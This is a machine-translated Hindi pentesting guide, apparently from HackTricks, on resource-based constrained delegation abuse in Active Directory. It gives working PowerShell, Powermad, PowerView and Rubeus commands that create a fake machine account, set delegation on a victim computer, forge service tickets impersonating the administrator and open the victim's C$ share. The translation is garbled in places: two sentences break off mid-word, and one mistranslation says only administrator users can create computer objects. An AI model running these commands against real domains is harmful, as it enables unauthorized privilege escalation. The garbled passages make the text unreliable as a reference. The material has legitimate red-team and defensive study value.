# संसाधन-आधारित सीमित अधिकार देना

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें** द्वारा **PRs सबमिट** करके [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## संसाधन-आधारित सीमित अधिकार देना की मूल बातें

यह मूल [सीमित अधिकार देना](constrained-delegation.md) के बराबर है लेकिन **इसके बजाय** किसी **वस्तु** को **किसी सेवा के खिलाफ किसी उपयोगकर्ता का अनुकरण करने की अनुमति देने की बजाय**। संसाधन-आधारित सीमित अधिकार देना **वस्तु में सेवा के खिलाफ किसी भी उपयोगकर्ता का अनुकरण करने की क्षमता रखता है**।

इस मामले में, सीमित वस्तु के पास _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ नामक एक विशेषता होगी जिसमें उपयोगकर्ता का नाम होगा जो उसके खिलाफ किसी अन्य उपयोगकर्ता का अनुकरण कर सकता है।

इस सीमित अधिकार देने से दूसरे अधिकार देनों की तुलना में एक और महत्वपूर्ण अंतर है कि किसी भी उपयोगकर्ता को **किसी मशीन खाते पर लिखने की अनुमति** होने पर (_GenericAll/GenericWrite/WriteDacl/WriteProperty/आदि_) वह _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ को सेट कर सकता है (अन्य प्रकार के अधिकार देने में आपको डोमेन व्यवस्थापक विशेषाधिकार चाहिए थे)।

### नए अवधारणाएँ

सीमित अधिकार देने में कहा गया था कि उपयोगकर्ता के _userAccountControl_ मान में **`TrustedToAuthForDelegation`** ध्वज की आवश्यकता है एक **S4U2Self** करने के लिए। लेकिन यह पूरी तरह सच नहीं है।\
यह सच्चाई है कि वह मान न होने पर भी, आप एक **सेवा** (SPN वाला) होने की स्थिति में किसी भी उपयोगकर्ता के खिलाफ **S4U2Self** कर सकते हैं, लेकिन, यदि आपके पास `TrustedToAuthForDelegation` है तो वापस मिलने वाला TGS **Forwardable** होगा और यदि आपके पास वह ध्वज नहीं है तो वापस मिलने वाला TGS **Forwardable** नहीं होगा।

हालांकि, यदि **S4U2Proxy** में उपयोग किया गया **TGS** **Forwardable नहीं** है तो एक **मूल सीमित अधिकार देने** का शोधन करने का प्रयास करने पर **काम नहीं करेगा**। लेकिन यदि आप **संसाधन-आधारित सीमित अधिकार देना** का शोधन करने का प्रयास कर रहे हैं, तो यह काम करेगा (यह कोई कमी नहीं है, यह एक सुविधा है, जाहिर है)।

### हमले का संरचना

> यदि आपके पास **कंप्यूटर** खाते पर **लिखने के समकक्ष अधिकार** हैं तो आप उस मशीन में **विशेषाधिकार** प्राप्त कर सकते हैं।

मान लें कि हमलावर के पास पहले से ही **विक्टिम कंप्यूटर** पर **लिखने के समकक्ष अधिकार** हैं।

1. हमलावर एक खाता को **कंप्रोमाइज** करता है जिसमें एक **SPN** है या एक बनाता है (“सेवा A”)। ध्यान दें कि **कोई भी** _व्यवस्थापक उपयोगकर्ता_ बिना किसी अन्य विशेष विशेषाधिकार के एक से लेकर 10 **कंप्यूटर वस्तुओं (**_**MachineAccountQuota**_**)** तक बना सकता है और उन्हें एक SPN सेट कर सकता है। इसलिए हमलावर बस एक कंप्यूटर वस्तु बना सकता है और एक SPN सेट कर सकता है।
2. हमलावर विक्टिम कंप्यूटर (सेवा B) पर अपने **लिखने के समकक्ष अधिकार** का दुरुपयोग करता है ताकि सेवा A को उस विक्टिम कंप्यूटर (सेवा B) के खिलाफ किसी भी उपयोगकर्ता का अनुकरण करने की अनुमति देने के लिए **संसाधन-आधारित सीमित अधिकार देना** कॉन्फ़िगर करें।
3. हमलावर Rubeus का उपयोग करके एक **पूर्ण S4U हमला** (S4U2Self और S4U2Proxy) करने के लिए सेवा A से सेवा B के लिए एक उपयोगकर्ता के लिए **विशेषाधिकार पहुंच** करता है।
1. S4U2Self (कंप्रोमाइज/बनाया गया SPN से): मुझे **प्रशासक का TGS** मांगें (Forwardable नहीं)।
2. S4U2Proxy: पिछले चरण के **Forwardable नहीं** TGS का उपयोग करके **प्रशासक** से **विक्टिम होस्ट** के लिए एक **TGS** मांगें।
3. यदि आप एक Forwardable TGS का उपयोग नहीं कर रहे हैं, फिर भी आप संसाधन-आधारित सीमित अधिकार देना दुरुपयोग कर रहे हैं, तो यह काम करेगा।
4. हमलावर **पास-द-टिकट** कर सकता है और **उपयोगकर्ता का अनुकरण** करके **विक्टिम सेवा B तक पहुंच** प्राप्त कर सकता है।

डोमेन की _**MachineAccountQuota**_ की जांच करने के लिए आप इस्तेमाल कर सकते हैं:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## हमला

### कंप्यूटर ऑब्जेक्ट बनाना

आप [powermad](https://github.com/Kevin-Robertson/Powermad) का उपयोग करके डोमेन के अंदर एक कंप्यूटर ऑब्ज
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### R**esource-based Constrained Delegation** कॉन्फ़िगर करना

**activedirectory PowerShell मॉड्यूल का उपयोग करें**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**पावरव्यू का उपयोग**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### एक पूर्ण S4U हमला करना

सबसे पहले, हमने `123456` पासवर्ड के साथ नया कंप्यूटर ऑब्ज
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
यह उस खाते के लिए RC4 और AES हैश प्रिंट करेगा।\
अब, हमला किया जा सकता है:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
आप Rubeus के `/altservice` पैरामीटर का उपयोग करके एक बार पूछकर अधिक टिकट उत्पन्न कर सकते हैं:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
ध्यान दें कि उपयोगकर्ताओं के पास "**डेलीगेट नहीं किया जा सकता**" नामक एक गुण होता है। यदि किसी उपयोगकर्ता के पास यह गुण सत्य है, तो आप उसकी अनुकरण नहीं कर सकेंगे। यह गुण ब्लडहाउंड के अंदर देखा जा सकता है।
{% endhint %}

### पहुंचना

आखिरी कमांड लाइन **पूर्ण S4U हमला करेगी और व्यवस्थापक से पीड़ित होस्ट में TGS** को **मेमोरी** में इंजेक्ट करेगी।\
इस उदाहरण में व्यवस्थापक से **CIFS** सेवा के लिए एक TGS का अनुरोध किया गया था, इसलिए आपको **C$** तक पहुंचने की स्वतंत्रता होगी:
```bash
ls \\victim.domain.local\C$
```
### विभिन्न सेवा टिकट का दुरुपयोग

[**यहाँ उपलब्ध सेवा टिकट के बारे में जानें**](silver-ticket.md#available-services).

## कर्बेरोस त्रुटियाँ

* **`KDC_ERR_ETYPE_NOTSUPP`**: इसका मतलब है कि कर्बेरोस को DES या RC4 का उपयोग नहीं करने के लिए कॉन्फ़िगर किया गया है और आप केवल RC4 हैश प्रदान कर रहे हैं। Rubeus को कम से कम AES256 हैश प्रदान करें (या बस rc4, aes128 और aes256 हैश प्रदान करें)। उदाहरण: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: इसका मतलब है कि वर्तमान कंप्यूटर का समय DC के समय से अलग है और कर्बेरोस सही ढंग से काम नहीं कर रहा है।
* **`preauth_failed`**: इसका मतलब है कि दिए गए उपयोगकर्ता नाम + हैश लॉगिन करने के लिए काम नहीं कर रहे हैं। आपने शायद उपयोगकर्ता नाम में "$" डालना भूल गए हो सकता है जब आप हैश जेनरेट कर रहे हो (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: इसका मतलब हो सकता है:
  * आप जिसे अनुकरण करने की कोशिश कर रहे हैं उसे वांछित सेवा तक पहुंचने की अनुमति नहीं है (क्योंकि आप उसे अनुकरण नहीं कर सकते या क्योंकि उसमें पर्याप्त विशेषाधिकार नहीं है)
  * पूछी गई सेवा मौजूद नहीं है (यदि आप विनर्म के लिए टिकट मांगते हैं लेकिन विनर्म नहीं चल रहा है)
  * बनाया गया फेक कंप्यूटर विचलित सर्वर पर अपने विशेषाधिकारों को खो चुका है और आपको उन्हें वापस देने की आवश्यकता है।

## संदर्भ

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
